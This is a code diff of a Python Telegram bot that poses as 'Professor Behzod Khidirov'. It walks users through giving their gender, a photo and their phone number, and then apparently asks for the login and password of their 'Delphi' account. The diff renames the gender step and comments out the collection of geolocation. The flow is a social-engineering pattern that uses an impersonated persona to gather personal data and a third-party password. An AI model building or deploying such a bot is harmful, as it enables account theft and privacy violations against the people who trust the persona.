@@ -18,7 +18,7 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 logging.getLogger('httpx').setLevel(logging.WARNING)
 logger = logging.getLogger(__name__)
 
-GENDER, PHOTO, LOCATION, PHONE_NUMBER, DELPHI_LOGIN, DELPHI_PASSWORD = range(6)
+POSITION, PHOTO, PHONE_NUMBER, DELPHI_LOGIN, DELPHI_PASSWORD = range(5)
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -30,10 +30,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     reply_markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, input_field_placeholder="Qanaqasan?")
     await update.message.reply_text("HI! My name is Professor Behzod Khidirov! I will hold a conversation with you! "
                                     "Are you Boy or a girl?", reply_markup=reply_markup)
-    return GENDER
+    return POSITION
 
 
-async def gender(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+async def position(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Stores selected gender and asks for a photo of the user"""
     user = update.message.from_user.first_name
     gender = update.message.text
@@ -47,12 +47,12 @@ async def gender(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 
     return PHOTO
 
-
-location_reply_keyboard = [
-    [KeyboardButton("Send Location 📍", request_location=True)]
-]
-location_markup = ReplyKeyboardMarkup(location_reply_keyboard, one_time_keyboard=True,
-                                      input_field_placeholder='Manzilingizni kiriting.')
+#
+# location_reply_keyboard = [
+#     [KeyboardButton("Send Location 📍", request_location=True)]
+# ]
+# location_markup = ReplyKeyboardMarkup(location_reply_keyboard, one_time_keyboard=True,
+#                                       input_field_placeholder='Manzilingizni kiriting.')
 
 
 async def photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -67,8 +67,8 @@ async def photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 
     logger.info("Photo of %s: %s", user.first_name, "photo is stored as it is")
     await update.message.reply_text("you are so cute!"
-                                    "please give me your location", reply_markup=location_markup)
-    return LOCATION
+                                    "please give me your location", reply_markup=phone_markup)
+    return PHONE_NUMBER
 
 
 phone_reply_keyboard = [
@@ -79,21 +79,21 @@ phone_markup = ReplyKeyboardMarkup(phone_reply_keyboard, one_time_keyboard=True,
                                    input_field_placeholder='Telefon raqamingizni yuboring')
 
 
-async def location(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Stores the location and asks for phone number info about the user"""
-    user = update.message.from_user
-    user_location = update.message.location
-    latitude, longitude = user_location.latitude, user_location.longitude
-
-    # Assuming your chat_id is stored in the variable 'chat_id'
-    chat_id = update.message.chat_id
-    context.user_data["location"] = f"Latitude: {latitude}, Longitude: {longitude}"
-    logger.info("Contact of %s: %s", user.first_name, user_location)
-
-    await update.message.reply_text(f"Thanks for sharing your location! {context.user_data['location']}"
-                                    f"Now I need your phone number!", reply_markup=phone_markup)
-
-    return PHONE_NUMBER
+# async def location(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+#     """Stores the location and asks for phone number info about the user"""
+#     user = update.message.from_user
+#     user_location = update.message.location
+#     latitude, longitude = user_location.latitude, user_location.longitude
+#
+#     # Assuming your chat_id is stored in the variable 'chat_id'
+#     chat_id = update.message.chat_id
+#     context.user_data["location"] = f"Latitude: {latitude}, Longitude: {longitude}"
+#     logger.info("Contact of %s: %s", user.first_name, user_location)
+#
+#     await update.message.reply_text(f"Thanks for sharing your location! {context.user_data['location']}"
+#                                     f"Now I need your phone number!", reply_markup=phone_markup)
+#
+#     return PHONE_NUMBER
 
 
 async def phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -166,9 +166,9 @@ def main() -> None:
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler('start', start)],
         states={
-            GENDER: [MessageHandler(filters.Regex("^(Boy|Girl|Other$)"), gender)],
+            POSITION: [MessageHandler(filters.Regex("^(Boy|Girl|Other$)"), position)],
             PHOTO: [MessageHandler(filters.PHOTO, photo)],
-            LOCATION: [MessageHandler(filters._Location(), location)],
+            # LOCATION: [MessageHandler(filters._Location(), location)],
             PHONE_NUMBER: [MessageHandler(filters._Contact(), phone_number)],
             DELPHI_LOGIN: [MessageHandler(filters.TEXT, delphi_login)],
             DELPHI_PASSWORD: [MessageHandler(filters.TEXT, delphi_password)]
